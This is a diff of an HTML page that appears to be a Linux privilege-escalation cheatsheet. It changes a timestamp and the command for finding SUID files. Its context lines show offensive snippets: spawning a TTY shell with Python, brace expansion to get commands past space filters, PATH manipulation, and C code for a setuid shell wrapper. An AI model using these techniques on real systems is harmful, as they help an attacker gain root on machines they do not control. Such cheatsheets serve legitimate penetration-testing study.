@@ -17,7 +17,7 @@ It can be very important, cause some exploits should be changed t">
 Call list of available shellscat /etc/shells
 It can be very important, cause some exploits should be changed t">
 <meta property="og:image" content="http://i.imgur.com/LnJlHyM.png">
-<meta property="og:updated_time" content="2017-02-01T00:11:04.120Z">
+<meta property="og:updated_time" content="2017-02-01T00:17:49.906Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux Privilege Escalation Cheatsheet">
 <meta name="twitter:description" content="Spawn TTY Shell with Pythonpython -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;
@@ -148,7 +148,7 @@ It can be very important, cause some exploits should be changed t">
 <p>So to execute something like <code>ls -lia</code> you can send: </p>
 <p><code>{ls,-lia}</code></p>
 <p><a href="https://jon.oberheide.org/blog/2008/09/04/bash-brace-expansion-cleverness/" target="_blank" rel="external">source</a></p>
-<h3 id="Searching-for-all-SUID-files"><a href="#Searching-for-all-SUID-files" class="headerlink" title="Searching for all SUID files"></a>Searching for all SUID files</h3><p><code>find $DIRECTORY -perm /u=s,g=s</code></p>
+<h3 id="Searching-for-all-SUID-files"><a href="#Searching-for-all-SUID-files" class="headerlink" title="Searching for all SUID files"></a>Searching for all SUID files</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
 <h3 id="Creating-symlink"><a href="#Creating-symlink" class="headerlink" title="Creating symlink"></a>Creating symlink</h3><p><code>ln -s /path/to/file /path/to/symlink</code></p>
 <h3 id="Add-current-directory-to-PATH-variable"><a href="#Add-current-directory-to-PATH-variable" class="headerlink" title="Add current directory to PATH variable"></a>Add current directory to PATH variable</h3><p><code>export PATH=.:$PATH</code></p>
 <h3 id="Create-and-compile-C-shell-file"><a href="#Create-and-compile-C-shell-file" class="headerlink" title="Create and compile C shell file"></a>Create and compile C shell file</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">int</span> euid = geteuid();</div><div class="line">        setresuid(euid, euid, euid);</div><div class="line">        system(<span class="string">"sh"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
